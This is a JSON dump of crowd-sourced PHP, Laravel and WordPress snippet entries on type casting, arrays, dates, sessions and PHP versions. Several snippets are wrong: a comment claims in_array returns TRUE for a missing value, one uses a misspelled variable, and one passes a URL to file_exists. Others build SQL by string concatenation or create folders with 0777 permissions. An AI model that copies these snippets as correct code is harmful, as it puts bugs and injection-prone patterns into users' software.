    "description": "intval($string);\nphpCopy<?php   $variable = \"abc\"; $integer = (int)$variable; echo \"The variable has converted to a number and its value is $integer.\";   ?> \n$num = \"3.14\";  $int = (int)$num;//string to int $float = (float)$num;//string to float\n$num = \"3.14\"; $int = (int)$num;\nphpCopy<?php   $variable = \"53\"; $integer = intval($variable); echo \"The variable $variable has converted to a number and its value is $integer.\";   echo \"\\n\";  $variable = \"25.3\"; $float = floatval($variable); echo \"The variable $variable has converted to a number and its value is $float.\";   ?> \n$myintvariable = intval($myvariable);\n",
    "reg_date": "2021-10-12T10:12:58.000Z"
  },
  {
    "id": 579,
    "keyword": null,
    "link": null,
    "title": " cast to boolean php",
    "description": "/** filter_var - Filters a variable with a specific filter **/ $boolvar = filter_var('true', FILTER_VALIDATE_BOOLEAN); /** boolval - Get the boolean value of a variable PHP 5 >= */ $boolvar = boolval ('true'); // And literally with a ternary operator but I can't recommend it $boolvar = ($string === 'true')  ? true: false;   /** We can convert any variable to boolean --- using the (bool) or (boolean) keyword ----- *** But we are talking about conversion not casting *** -   So any String whose length is greater than 0 is true  -   and any number other than 0 is true **/ echo $boolvar = (bool)1; //return true echo $boolvar = (bool)\"true\"; //return true echo $boolvar = (bool)\"false\"; //return true echo $boolvar = (bool)0; //return false echo $boolvar = (bool)\"\"; //return false  var_dump((bool) 0);//return false  var_dump((bool) \"\");//return false \n/**  * Strings always evaluate to boolean true unless they have a  * value that's considered \"empty\" by PHP (taken from the  * documentation for empty):  * \"\" (an empty string) evaluates as false.  * \"0\" (0 as a string) evaulates as false.  * If you need to set a boolean based on the text value of a  * string, then you'll need to check for the presence or  * otherwise of that value.  */ $boolean = $string === 'true' ? true: false;\n// (PHP 5 >= 5.5.0, PHP 7) // boolval &mdash; Get the boolean value of a variable boolval ( mixed $var ) : bool // Returns the boolean value of var.\n",
    "reg_date": "2021-10-12T10:12:58.000Z"
  },
  {
    "id": 580,
    "keyword": null,
    "link": null,
    "title": " casts in model laravel",
    "description": "Once the cast is defined, you may access   the options attribute and    it will automatically be deserialized    from JSON into a PHP array. When you set    the value of the options attribute, the given    array will automatically be serialized back into    JSON for storage:   use App\\Models\\User;  $user = User::find(1);  $options = $user->options;  $options['key'] = 'value';  $user->options = $options;  $user->save();\n",
    "reg_date": "2021-10-12T10:12:58.000Z"
  },
  {
    "id": 581,
    "keyword": null,
    "link": null,
    "title": " category hierarchy laravel",
    "description": "<?php  namespace App;  use Illuminate\\Database\\Eloquent\\Model;  class Category extends Model {     // One level child     public function child() {         return $this->hasMany('App\\Category', 'parent_category_id');     }      // Recursive children     public function children() {         return $this->hasMany('App\\Category', 'parent_category_id')           \t\t\t->with('children');     }      // One level parent     public function parent() {         return $this->belongsTo('App\\Category', 'parent_category_id');     }      // Recursive parents     public function parents() {         return $this->belongsTo('App\\Category', 'parent_category_id')           \t\t\t->with('parent');     }  }\n",
    "reg_date": "2021-10-12T10:12:58.000Z"
  },
  {
    "id": 582,
    "keyword": null,
    "link": null,
    "title": " category name wp query",
    "description": "$query = new WP_Query( array( 'category_name' => 'staff' ) );  cat (int) &ndash; use category id. category_name (string) &ndash; use category slug. category__and (array) &ndash; use category id. category__in (array) &ndash; use category id. category__not_in (array) &ndash; use category id.\n",
    "reg_date": "2021-10-12T10:12:58.000Z"
  },
  {
    "id": 583,
    "keyword": null,
    "link": null,
    "title": " category title in post",
    "description": "<?php foreach((get_the_category()) as $category) {      echo $category->cat_name . ' ';  }  ?>\n",
    "reg_date": "2021-10-12T10:12:58.000Z"
  },
  {
    "id": 584,
    "keyword": null,
    "link": null,
    "title": " ccreate array php",
    "description": "$array = array(     \"foo\" => \"bar\",     \"bar\" => \"foo\", );\n// sequential array $arr = array(   'v1',\t\t// $arr[0] == 'v1'   'v2',\t\t// $arr[1] == 'v2'   'v3'\t\t// $arr[2] == 'v3' ); // or (since PHP 5.4) $arr = [   'v1',\t\t// $arr[0] == 'v1'   'v2',\t\t// $arr[1] == 'v2'   'v3'\t\t// $arr[2] == 'v3' ];  // key accessed array (map like) $arr = array(   'k1' => 'v1',\t\t// $arr['k1'] == 'v1'   'k2' => 'v2',\t\t// $arr['k2'] == 'v2'   'k3' => 'v3'\t\t// $arr['k3'] == 'v3' ); // or (since PHP 5.4) $arr = [   'k1' => 'v1',\t\t// $arr['k1'] == 'v1'   'k2' => 'v2',\t\t// $arr['k2'] == 'v2'   'k3' => 'v3'\t\t// $arr['k3'] == 'v3' ];\n",
    "reg_date": "2021-10-12T10:12:59.000Z"
  },
  {
    "id": 585,
    "keyword": null,
    "link": null,
    "title": " centos :Install or enable PHP gd extension.",
    "description": "apt-get install php-gd \nyum install gd gd-devel php-gd and then restart apache: service httpd restart \n",
    "reg_date": "2021-10-12T10:12:59.000Z"
  },
  {
    "id": 586,
    "keyword": null,
    "link": null,
    "title": " centos excecutable php",
    "description": "/usr/bin/php\n",
    "reg_date": "2021-10-12T10:12:59.000Z"
  },
  {
    "id": 587,
    "keyword": null,
    "link": null,
    "title": " centos search directory php.exe",
    "description": "/usr/bin/php\n",
    "reg_date": "2021-10-12T10:12:59.000Z"
  },
  {
    "id": 588,
    "keyword": null,
    "link": null,
    "title": " change background color php",
    "description": "if blablabla {   echo '<body style=\"background-color:white\">'; } else {  echo '<body style=\"background-color:orange\">'; }\n",
    "reg_date": "2021-10-12T10:12:59.000Z"
  },
  {
    "id": 589,
    "keyword": null,
    "link": null,
    "title": " change date format php",
    "description": "To convert the date-time format PHP provides strtotime() and date() function. We change the date format from one format to another.  Change YYYY-MM-DD to DD-MM-YYYY <? php. $currDate = \"2020-04-18\"; $changeDate = date(\"d-m-Y\", strtotime($currDate)); echo \"Changed date format is: \". $changeDate. \" (MM-DD-YYYY)\"; ?>\n$currDate = \"2020-08-25\"; $changeDate = date(\"d-m-Y\", strtotime($currDate)); echo $changedDate;\n",
    "reg_date": "2021-10-12T10:12:59.000Z"
  },
  {
    "id": 590,
    "keyword": null,
    "link": null,
    "title": " change datetime format from Y-m-d h:i:s to d-m-Y in php",
    "description": "$old_date = date('l, F d y h:i:s');              // returns Saturday, January 30 10 02:06:34 $old_date_timestamp = strtotime($old_date); $new_date = date('Y-m-d H:i:s', $old_date_timestamp);    \n$var = '20/04/2012'; $date = str_replace('/', '-', $var); echo date('Y-m-d', strtotime($date));\n",
    "reg_date": "2021-10-12T10:12:59.000Z"
  },
  {
    "id": 591,
    "keyword": null,
    "link": null,
    "title": " change existing migration laravel",
    "description": "php artisan make:migration update_user_guide_in_product_translations_table\nTo Generate Laravel Migrations from an existing database.    Use the following package.    https://github.com/Xethron/migrations-generator\nphp artisan make:migration update_description_in_products_table\n",
    "reg_date": "2021-10-12T10:12:59.000Z"
  },
  {
    "id": 592,
    "keyword": null,
    "link": null,
    "title": " change field name in validation laravel 8",
    "description": "$this->validate([   'userid' =>'required|min:3|max:100',   'username' =>'required|min:3',   'password' =>'required|max:15|confirmed', ], [], [   'userid' => 'User ID' ]);\n",
    "reg_date": "2021-10-12T10:12:59.000Z"
  },
  {
    "id": 593,
    "keyword": null,
    "link": null,
    "title": " change key with the value php",
    "description": "$arr[$newkey] = $arr[$oldkey]; unset($arr[$oldkey]);\n",
    "reg_date": "2021-10-12T10:12:59.000Z"
  },
  {
    "id": 594,
    "keyword": null,
    "link": null,
    "title": " change minutes in to hours carbon",
    "description": "You can use: ---------------- $minutes = 1510; $hours = intdiv($minutes, 60).':'. ($minutes % 60); !!! This only works with php >= v7.xx  Previous answer: ------------------- $minutes = 1510; $hours = floor($minutes / 60).':'.($minutes - floor($minutes / 60) * 60);\n",
    "reg_date": "2021-10-12T10:13:00.000Z"
  },
  {
    "id": 595,
    "keyword": null,
    "link": null,
    "title": " change php max upload size",
    "description": "; Maximum allowed size for uploaded files. upload_max_filesize = 40M  ; Must be greater than or equal to upload_max_filesize post_max_size = 40M \n",
    "reg_date": "2021-10-12T10:13:00.000Z"
  },
  {
    "id": 596,
    "keyword": null,
    "link": null,
    "title": " change php version in composer does not satisfy that requirement",
    "description": "composer install --ignore-platform-reqs \n",
    "reg_date": "2021-10-12T10:13:00.000Z"
  },
  {
    "id": 597,
    "keyword": null,
    "link": null,
    "title": " change php version linux nginx",
    "description": "sudo update-alternatives --config php \n",
    "reg_date": "2021-10-12T10:13:00.000Z"
  },
  {
    "id": 598,
    "keyword": null,
    "link": null,
    "title": " change php version ubuntu",
    "description": "//In ubunutu Default PHP 7.1 is set on your system and you need to switch to PHP 5.6  $ sudo a2dismod php7.1 $ sudo a2enmod php5.6 $ sudo service apache2 restart    sudo update-alternatives --set php /usr/bin/php5.6\n$ sudo update-alternatives --config php  or $ sudo a2enmod php7.1(version) \nsudo apt-get install software-properties-common sudo add-apt-repository ppa:ondrej/php sudo apt-get update sudo apt-get upgrade sudo apt-get install -y php7.3 \nsudo update-alternatives --config php\nupdate-alternatives --set php /usr/bin/php7.4 update-alternatives --set phar /usr/bin/phar7.4 update-alternatives --set phar.phar /usr/bin/phar.phar7.4 update-alternatives --set phpize /usr/bin/phpize7.4 update-alternatives --set php-config /usr/bin/php-config7.4 \n",
    "reg_date": "2021-10-12T10:13:00.000Z"
  },
  {
    "id": 599,
    "keyword": null,
    "link": null,
    "title": " change php version using htaccess",
    "description": "# php -- BEGIN cPanel-generated handler, do not edit # Set the &ldquo;ea-php74&rdquo; package as the default &ldquo;PHP&rdquo; programming language. <IfModule mime_module>   AddHandler application/x-httpd-ea-php74 .php .php7 .phtml </IfModule> # php -- END cPanel-generated handler, do not edit\nAddHandler application/x-httpd-php54 .php AddHandler application/x-httpd-php7 .php AddHandler application/x-httpd-php71 .php\n",
    "reg_date": "2021-10-12T10:13:00.000Z"
  },
  {
    "id": 600,
    "keyword": null,
    "link": null,
    "title": " change the method name in resource in laravel",
    "description": "Route::resource('my/path/to/whereever/I/like', 'MyController', [     'names' => [         'index' => 'my_route_base_name.index',         'edit' => 'my_route_base_name.edit',         'create' => 'my_route_base_name.create',         etc...     ], ])\n",
    "reg_date": "2021-10-12T10:13:00.000Z"
  },
  {
    "id": 601,
    "keyword": null,
    "link": null,
    "title": " change the php version in linux",
    "description": "sudo update-alternatives --set php /usr/bin/php7.2 sudo update-alternatives --set phar /usr/bin/phar7.2 sudo update-alternatives --set phar.phar /usr/bin/phar.phar7.2 sudo update-alternatives --set phpize /usr/bin/phpize7.2 sudo update-alternatives --set php-config /usr/bin/php-config7.2 \n",
    "reg_date": "2021-10-12T10:13:00.000Z"
  },
  {
    "id": 602,
    "keyword": null,
    "link": null,
    "title": " change wordpress login logo without plugin",
    "description": "add_theme_support( 'custom-logo' ); \nif ( function_exists( 'the_custom_logo' ) ) {  the_custom_logo(); } \nfunction wpb_login_logo() { ?>     <style type=\"text/css\">         #login h1 a, .login h1 a {             background-image: url(http://path/to/your/custom-logo.png);         height:100px;         width:300px;         background-size: 300px 100px;         background-repeat: no-repeat;         padding-bottom: 10px;         }     </style> <?php } add_action( 'login_enqueue_scripts', 'wpb_login_logo' ); \n",
    "reg_date": "2021-10-12T10:13:00.000Z"
  },
  {
    "id": 603,
    "keyword": null,
    "link": null,
    "title": " check all php version installed ubuntu",
    "description": " php --version \nLists down all installed php versions  sudo update-alternatives --list php\nphp -version\n",
    "reg_date": "2021-10-12T10:13:00.000Z"
  },
  {
    "id": 604,
    "keyword": null,
    "link": null,
    "title": " check composer php version",
    "description": "composer -vvv about\n",
    "reg_date": "2021-10-12T10:13:01.000Z"
  },
  {
    "id": 605,
    "keyword": null,
    "link": null,
    "title": " check directory exists in php",
    "description": "<?php $directory = \"./videos/category/\"; if (!file_exists($directory)) {   mkdir($directory, 0777, true); } ?>\n <?php $filename = '/path/to/foo.txt';  if (file_exists($filename)) {     echo \"The file $filename exists\"; } else {     echo \"The file $filename does not exist\"; } ?>  \n",
    "reg_date": "2021-10-12T10:13:01.000Z"
  },
  {
    "id": 606,
    "keyword": null,
    "link": null,
    "title": " check duplicate data in array php",
    "description": "$counts = array_count_values($array);             $duplicate_title  = array_filter($array, function ($value) use ($counts) {                 return $counts[$value] > 1;             });\nfunction has_dupes($array) {     $dupe_array = array();     foreach ($array as $val) {         if (++$dupe_array[$val] > 1) {             return true;         }     }     return false; }\n",
    "reg_date": "2021-10-12T10:13:01.000Z"
  },
  {
    "id": 607,
    "keyword": null,
    "link": null,
    "title": " check email exist or not wordpress",
    "description": "$email = 'myemail@example.com'; $exists = email_exists( $email ); if ( $exists ) {     echo \"That E-mail is registered to user number \" . $exists; } else {     echo \"That E-mail doesn't belong to any registered users on this site\"; }\n",
    "reg_date": "2021-10-12T10:13:01.000Z"
  },
  {
    "id": 608,
    "keyword": null,
    "link": null,
    "title": " check empty laravel blade",
    "description": " @empty($products)         <p class=\"bg-danger text-white p-1\">product</p> @else         <p class=\"bg-danger text-white p-1\">no product</p>  @endempty\n@isset($records)     // $records is defined and is not null... @endisset  @empty($records)     // $records is \"empty\"... @endempty\n",
    "reg_date": "2021-10-12T10:13:01.000Z"
  },
  {
    "id": 609,
    "keyword": null,
    "link": null,
    "title": " check file selected in php",
    "description": "if(!isset($_FILES['file_upload']) || $_FILES['file_upload']['error'] == UPLOAD_ERR_NO_FILE) {     echo \"Error no file selected\";  } else {     print_r($_FILES); }\n",
    "reg_date": "2021-10-12T10:13:01.000Z"
  },
  {
    "id": 610,
    "keyword": null,
    "link": null,
    "title": " check for an existing user laravel eloquent",
    "description": "$user = User::where('email', '=', Input::get('email'))->first(); if ($user === null) {    // user doesn't exist }\nif (User::where('email', '=', Input::get('email'))->exists()) {    // user found }\n$users = User::where('email', '=', $request->input('email'))->first(); if ($users === null) {   // User does not exist } else {   // User exits }\n",
    "reg_date": "2021-10-12T10:13:01.000Z"
  },
  {
    "id": 611,
    "keyword": null,
    "link": null,
    "title": " check if a string contains a substring php",
    "description": "$myString = 'Hello Bob how are you?';  if (strpos($myString, 'Bob') !== false) {      echo \"My string contains Bob\";  }\n$a = 'How are you?';  if (strpos($a, 'are') !== false) {     echo 'true'; } \nif (strpos($string, 'substring') !== false) { \t// do stuff  }\n$a = 'How are you?';  if (strpos($a, 'are') !== false) {     echo 'true'; }\n$result = strpos(\"haystack\", \"needle\");  if ($result != false) {   // text found }\n$mystring = 'abc'; $findme   = 'a'; $pos = strpos($mystring, $findme);\n",
    "reg_date": "2021-10-12T10:13:01.000Z"
  },
  {
    "id": 612,
    "keyword": null,
    "link": null,
    "title": " check if a string is url or not php",
    "description": "<?php   if(filter_var($imagePath, FILTER_VALIDATE_URL) === FALSE){       echo \"Not valide URL\";   }else{       echo \"valide URL\";   }\npreg_match('/(http|ftp|mailto)/', $string, $matches); var_dump($matches);\n",
    "reg_date": "2021-10-12T10:13:01.000Z"
  },
  {
    "id": 613,
    "keyword": null,
    "link": null,
    "title": " check if ajax request php",
    "description": "if(!empty($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest') { \t/* special ajax here */ \tdie($content); }\n",
    "reg_date": "2021-10-12T10:13:02.000Z"
  },
  {
    "id": 614,
    "keyword": null,
    "link": null,
    "title": " check if all values in array are equal php",
    "description": "if(count(array_unique($array)) === 1) {     // all values in $array are the same } else {     // at least 1 value in $array is different }\nif(count(array_unique($array, SORT_REGULAR)) < count($array)) {     // $array has duplicates } else {     // $array does not have duplicates }\n1. Check if all values are equal without knowing the values from array: $array = array('true', 'true', 'true'); if((count(array_unique($array)) === 1)) {   echo \"all equal\"; } else {   echo \"not equal\"; }  2. Check if all values are equal when you know the value from array: - In this case we know the equal value should be \"true\"  $array = array('true', 'true', 'true'); if (count(array_unique($array)) === 1 && end($array) === 'true') { }\n",
    "reg_date": "2021-10-12T10:13:02.000Z"
  },
  {
    "id": 615,
    "keyword": null,
    "link": null,
    "title": " check if array has value php",
    "description": "$myArr = [38, 18, 10, 7, \"15\"];  echo in_array(10, $myArr); // TRUE echo in_array(19, $myArr); // TRUE  // Without strict check echo in_array(\"18\", $myArr); // TRUE // With strict check echo in_array(\"18\", $myArr, true); // FALSE\nin_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] ) : bool    // Without strict check echo in_array(\"18\", $myArr); // TRUE // With strict check echo in_array(\"18\", $myArr, true); // FALSE\n$os = array(\"Mac\", \"NT\", \"Irix\", \"Linux\"); if (in_array(\"Irix\", $os)) {     echo \"Got Irix\"; } if (in_array(\"mac\", $os)) {     echo \"Got mac\"; }\nThe in_array() function is an inbuilt function in PHP.  The in_array() function is used to check whether a given value exists in an array or not. It returns TRUE if the given value is found in the given array, and FALSE otherwise.    <?php    $people = array(\"Peter\", \"Joe\", \"Glenn\", \"Cleveland\");  if (in_array(\"Glenn\", $people))   {   echo \"Match found\";   } else   {   echo \"Match not found\";   }  ?>\n$allowedFileType = ['application/vnd.ms-excel','text/xls','text/xlsx','application/vnd.openxmlformats-officedocument.spreadsheetml.sheet'];    if(in_array($_FILES[\"file\"][\"type\"],$allowedFileType))\n",
    "reg_date": "2021-10-12T10:13:02.000Z"
  },
  {
    "id": 616,
    "keyword": null,
    "link": null,
    "title": " check if array is empty php",
    "description": "if (empty($array)) {      // list is empty. }\n$arr = array();  if(!empty($arr)){   echo \"not empty\"; } else  {   echo \"empty\"; } \n// Declare an array and initialize it  $non_empty_array = array('apples' => '2');     // Declare an empty array  $empty_array = array();     // Condition to check array is empty or not  if(!empty($non_empty_array)) {     echo \"Given Array is not empty <br>\";  } if(empty($empty_array)) {     echo \"Given Array is empty\";  }\n",
    "reg_date": "2021-10-12T10:13:02.000Z"
  },
  {
    "id": 617,
    "keyword": null,
    "link": null,
    "title": " check if array value exists in another array php",
    "description": "$result = !empty(array_intersect($people, $criminals));\n$containsAllValues = !array_diff($search_this, $all); \n",
    "reg_date": "2021-10-12T10:13:02.000Z"
  },
  {
    "id": 618,
    "keyword": null,
    "link": null,
    "title": " check if array values exists in another array",
    "description": "$result = !empty(array_intersect($people, $criminals));\n",
    "reg_date": "2021-10-12T10:13:02.000Z"
  },
  {
    "id": 619,
    "keyword": null,
    "link": null,
    "title": " check if cookie exists php",
    "description": "if (!isset($_COOKIE[\"lg\"])) { \tsetcookie(\"lg\", \"ro\"); }\n",
    "reg_date": "2021-10-12T10:13:02.000Z"
  },
  {
    "id": 620,
    "keyword": null,
    "link": null,
    "title": " check if date between two dates laravel eloquent",
    "description": "//get or exist data between two dates return Set::where('type', $type)             ->whereDate('active_start', '<=', date(\"Y-m-d\"))             ->whereDate('active_end', '>=', date(\"Y-m-d\"))             ->first(); //@sujay\n<?php    //check if date between two dates $currentDate = date('Y-m-d'); $currentDate = date('Y-m-d', strtotime($currentDate));    $startDate = date('Y-m-d', strtotime(\"01/09/2019\")); $endDate = date('Y-m-d', strtotime(\"01/10/2019\"));    if (($currentDate >= $startDate) && ($currentDate <= $endDate)){      echo \"Current date is between two dates\"; }else{       echo \"Current date is not between two dates\";   } //@sujay\nsdfsdf\n",
    "reg_date": "2021-10-12T10:13:02.000Z"
  },
  {
    "id": 621,
    "keyword": null,
    "link": null,
    "title": " check if date is past php",
    "description": "$date = new DateTime($event['date']); $now = new DateTime(); if($date < $now) {     echo 'Date is in the past'; }\n",
    "reg_date": "2021-10-12T10:13:03.000Z"
  },
  {
    "id": 622,
    "keyword": null,
    "link": null,
    "title": " check if date is within range php",
    "description": "$start_date = '2020-10-21'; $end_date = '2020-10-15'; $date_check = '2020-08-28';  if ($this->check_in_range($start_date, $end_date, $date_from_user)) {   echo \"within range\"; } else {   echo \"not within range\"; }  function check_in_range($start_date, $end_date, $date_from_user) {   // Convert to timestamp   $start = strtotime($start_date);   $end = strtotime($end_date);   $check = strtotime($date_from_user);    // Check that user date is between start & end   return (($start <= $check ) && ($check <= $end)); }\n",
    "reg_date": "2021-10-12T10:13:03.000Z"
  },
  {
    "id": 623,
    "keyword": null,
    "link": null,
    "title": " check if delete query was successful laravel",
    "description": "try {     DB::table('user_')->where('column',$something)->delete();     $queryStatus = \"Successful\"; } catch(Exception $e) {     $queryStatus = \"Not success\"; }\n",
    "reg_date": "2021-10-12T10:13:03.000Z"
  },
  {
    "id": 624,
    "keyword": null,
    "link": null,
    "title": " check if divisible php",
    "description": "if($number % 15 == 0)  {     echo \"BY3 AND 5\"; } elseif ($number % 5 == 0) {     echo \"BY5\"; } elseif ($number % 3 == 0) {     echo \"BY3\"; }\n",
    "reg_date": "2021-10-12T10:13:03.000Z"
  },
  {
    "id": 625,
    "keyword": null,
    "link": null,
    "title": " check if includes numbers php",
    "description": "$var_num = \"1\"; $var_str = \"Hello World\";  var_dump( is_numeric($var_num), is_numeric($var_str) );  /*  Output -  bool(true)  bool(false) */\nif (preg_match('~[0-9]+~', $string)) {     echo 'string with numbers'; } \nif (preg_match('/[A-Za-z]/', $myString) && preg_match('/[0-9]/', $myString)) {     echo 'Contains at least one letter and one number'; }\n",
    "reg_date": "2021-10-12T10:13:03.000Z"
  },
  {
    "id": 626,
    "keyword": null,
    "link": null,
    "title": " check if input file is set codeigniter",
    "description": "if (empty($_FILES['userfile']['name'])) { }\n",
    "reg_date": "2021-10-12T10:13:03.000Z"
  },
  {
    "id": 627,
    "keyword": null,
    "link": null,
    "title": " check if logged laravel",
    "description": "use Illuminate\\Support\\Facades\\Auth;  if (Auth::check()) {     // The user is logged in... }\n",
    "reg_date": "2021-10-12T10:13:03.000Z"
  },
  {
    "id": 628,
    "keyword": null,
    "link": null,
    "title": " check if number is float in php",
    "description": "//check if number is float $float = is_float(2.4); echo $float; //Returns true (1) if number is a float and false otherwise \n",
    "reg_date": "2021-10-12T10:13:03.000Z"
  },
  {
    "id": 629,
    "keyword": null,
    "link": null,
    "title": " check if number is multiple of 3 in php",
    "description": "You can check simply by using below code: if($num%3==0){   echo \"the number is multiple of 3\"; }\nif ($count % 20 != 0)\n",
    "reg_date": "2021-10-12T10:13:04.000Z"
  },
  {
    "id": 630,
    "keyword": null,
    "link": null,
    "title": " check if object has method php",
    "description": " <?php $directory = new Directory('.'); var_dump(method_exists($directory,'read')); ?>  \n",
    "reg_date": "2021-10-12T10:13:04.000Z"
  },
  {
    "id": 631,
    "keyword": null,
    "link": null,
    "title": " check if post id exists wordpress",
    "description": "post_exists(get_the_title($postID)); //returns $postID or 0\n",
    "reg_date": "2021-10-12T10:13:04.000Z"
  },
  {
    "id": 632,
    "keyword": null,
    "link": null,
    "title": " check if post request php",
    "description": "Better use $_SERVER['REQUEST_METHOD']:  if ($_SERVER['REQUEST_METHOD'] === 'POST') {     // &hellip; }\n",
    "reg_date": "2021-10-12T10:13:04.000Z"
  },
  {
    "id": 633,
    "keyword": null,
    "link": null,
    "title": " check if session is set",
    "description": "if (isset($_SESSION[\"userid\"])) { \techo \"Logged in\"; } else { \techo \"Not Logged in\"; }\n",
    "reg_date": "2021-10-12T10:13:04.000Z"
  },
  {
    "id": 634,
    "keyword": null,
    "link": null,
    "title": " check if session is started php",
    "description": "if (session_status() == PHP_SESSION_NONE) {     session_start(); }\n<?php if(session_status() == PHP_SESSION_ACTIVE){     //a session is already running     session_destroy(); //stops the session } ?>\n#you could just ignore warnings messages @session_start(); \n",
    "reg_date": "2021-10-12T10:13:04.000Z"
  },
  {
    "id": 635,
    "keyword": null,
    "link": null,
    "title": " check if session variable exists php",
    "description": "if (isset($_SESSION['errors'])) {     //Do stuff }\n",
    "reg_date": "2021-10-12T10:13:04.000Z"
  },
  {
    "id": 636,
    "keyword": null,
    "link": null,
    "title": " check if string contains character php",
    "description": "$myString = 'Hello Bob how are you?';  if (strpos($myString, 'Bob') !== false) {      echo \"My string contains Bob\";  }\n$a = 'How are you?';  if (strpos($a, 'are') !== false) {     echo 'true'; } \nif (strpos($string, 'substring') !== false) { \t// do stuff  }\n$a = 'Hello world?';  if (strpos($a, 'Hello') !== false) { //PAY ATTENTION TO !==, not !=     echo 'true'; } if (stripos($a, 'HELLO') !== false) { //Case insensitive     echo 'true'; }\n$haystack = 'This is my haystack that we shall check' $has_A = strpos($haystack, 'A') !== false; $has_a = strpos($haystack, 'a') !== false; \n// this method is new with PHP 8 and above $haystack = \"Damn, I wonder if this string contains a comma.\"; if (str_contains($haystack, \",\")) { \techo \"There is a comma!!\"; }\n",
    "reg_date": "2021-10-12T10:13:04.000Z"
  },
  {
    "id": 637,
    "keyword": null,
    "link": null,
    "title": " check if string contains only whitespace php",
    "description": "if ($str == trim($str) && strpos($str, ' ') !== false) {     echo 'has spaces, but not at beginning or end'; }\nctype_space(\"  \") //returns true  ctype_space(\"   a   \") //returns false\n",
    "reg_date": "2021-10-12T10:13:04.000Z"
  },
  {
    "id": 638,
    "keyword": null,
    "link": null,
    "title": " check if string is number or not php",
    "description": "$var_num = \"1\"; $var_str = \"Hello World\";  var_dump( is_numeric($var_num), is_numeric($var_str) );  /*  Output -  bool(true)  bool(false) */\n <?php if (is_numeric(887)) { echo \"Yes\"; } else { echo \"No\"; } ?>\n",
    "reg_date": "2021-10-12T10:13:04.000Z"
  },
  {
    "id": 639,
    "keyword": null,
    "link": null,
    "title": " check if table exists sql php",
    "description": "if ($result = $mysqli->query(\"SHOW TABLES LIKE '\".$table.\"'\")) {     if($result->num_rows == 1) {         echo \"Table exists\";     } } else {     echo \"Table does not exist\"; } \n",
    "reg_date": "2021-10-12T10:13:05.000Z"
  },
  {
    "id": 640,
    "keyword": null,
    "link": null,
    "title": " check if text exists in string php",
    "description": "$a = 'How are you?';  if (strpos($a, 'are') !== false) {     echo 'true'; } \n",
    "reg_date": "2021-10-12T10:13:05.000Z"
  },
  {
    "id": 641,
    "keyword": null,
    "link": null,
    "title": " check if user has role twig",
    "description": "{% if is_granted('ROLE_ADMIN') %} ... {% endif %}\n{% if is_granted('ROLE_ADMIN') %}     <a href=\"...\">Delete</a> {% endif %}\n",
    "reg_date": "2021-10-12T10:13:05.000Z"
  },
  {
    "id": 642,
    "keyword": null,
    "link": null,
    "title": " check if user is on mobile php",
    "description": "function isMobile() {     return preg_match(\"/(android|avantgo|blackberry|bolt|boost|cricket|docomo|fone|hiptop|mini|mobi|palm|phone|pie|tablet|up\\.browser|up\\.link|webos|wos)/i\", $_SERVER[\"HTTP_USER_AGENT\"]); } \n",
    "reg_date": "2021-10-12T10:13:05.000Z"
  },
  {
    "id": 643,
    "keyword": null,
    "link": null,
    "title": " check if valid url php",
    "description": "filter_var($url, FILTER_VALIDATE_URL);\n",
    "reg_date": "2021-10-12T10:13:05.000Z"
  },
  {
    "id": 644,
    "keyword": null,
    "link": null,
    "title": " check if value exists in object php",
    "description": "if (property_exists($ob, 'a')) \n",
    "reg_date": "2021-10-12T10:13:05.000Z"
  },
  {
    "id": 645,
    "keyword": null,
    "link": null,
    "title": " check if value is not null in db laravel",
    "description": "Model::whereNotNull('sent_at')\n",
    "reg_date": "2021-10-12T10:13:05.000Z"
  },
  {
    "id": 646,
    "keyword": null,
    "link": null,
    "title": " check image is available on server php",
    "description": "if (file_exists('http://www.mydomain.com/images/'.$filename)) {  &hellip; }\n",
    "reg_date": "2021-10-12T10:13:05.000Z"
  },
  {
    "id": 647,
    "keyword": null,
    "link": null,
    "title": " check input value is integer or not in php",
    "description": "$a = 5; //returns true $a = \"5\"; //returns false $a = 5.3; //returns false is_int($a);\n// to check the input integer validation we can use is_int() function Syntax: is_int(parameter);  $x = 10; //returns true $x = \"123\"; //returns false $x = 12.365; //returns false $x = \"ankur\"; //returns false is_int($x);\n// Check if variable is int $id = \"1\";  if(!intval($id)){   throw new Exception(\"Not Int\", 404); } else{ \t// this variable is int }\n",
    "reg_date": "2021-10-12T10:13:05.000Z"
  },
  {
    "id": 648,
    "keyword": null,
    "link": null,
    "title": " check laravel version",
    "description": "php artisan --version\nphp artisan --version   or php artisan -v\n$php artisan --version\nphp artisan --version  //enter in terminal\n//laravel installer laravel --version\nphp ./artisan --version ##or php artisan --version\n",
    "reg_date": "2021-10-12T10:13:05.000Z"
  },
  {
    "id": 649,
    "keyword": null,
    "link": null,
    "title": " check mail php",
    "description": "filter_var($email, FILTER_VALIDATE_EMAIL)\n",
    "reg_date": "2021-10-12T10:13:06.000Z"
  },
  {
    "id": 650,
    "keyword": null,
    "link": null,
    "title": " check network connection php",
    "description": "$response = null; system(\"ping -c 1 google.com\", $response); if($response == 0) {     // this means you are connected }\n",
    "reg_date": "2021-10-12T10:13:06.000Z"
  },
  {
    "id": 651,
    "keyword": null,
    "link": null,
    "title": " check null in array php",
    "description": "if (!empty($data_days) && in_array(1, $data_days, true)){ // use numeric value 1, not string\n",
    "reg_date": "2021-10-12T10:13:06.000Z"
  },
  {
    "id": 652,
    "keyword": null,
    "link": null,
    "title": " check null in laravel blade",
    "description": "@if(is_null($variable)\n",
    "reg_date": "2021-10-12T10:13:06.000Z"
  },
  {
    "id": 653,
    "keyword": null,
    "link": null,
    "title": " check php version",
    "description": "echo PHP_VERSION;\n<?php echo 'PHP version: ' . phpversion(); ?>\n/* in terminal type it*/ php -v\n<?php   echo 'PHP version:' . phpinfo(); ?>  \n<?phpphpinfo(); ?>\nset PATH=%PATH%;C:\\path\\to\\php \n",
    "reg_date": "2021-10-12T10:13:06.000Z"
  },
  {
    "id": 654,
    "keyword": null,
    "link": null,
    "title": " check php version linux terminal",
    "description": " php --version \n/* in terminal type it*/ php -v\nphp -version\n# php -v PHP 5.4.16 (cli) (built: Mar  7 2018 13:34:47)  Copyright (c) 1997-2013 The PHP Group Zend Engine v2.4.0, Copyright (c) 1998-2013 Zend Technologies\n# php --version PHP 5.4.16 (cli) (built: Mar  7 2018 13:34:47)  Copyright (c) 1997-2013 The PHP Group Zend Engine v2.4.0, Copyright (c) 1998-2013 Zend Technologies\n",
    "reg_date": "2021-10-12T10:13:06.000Z"
  },
  {
    "id": 655,
    "keyword": null,
    "link": null,
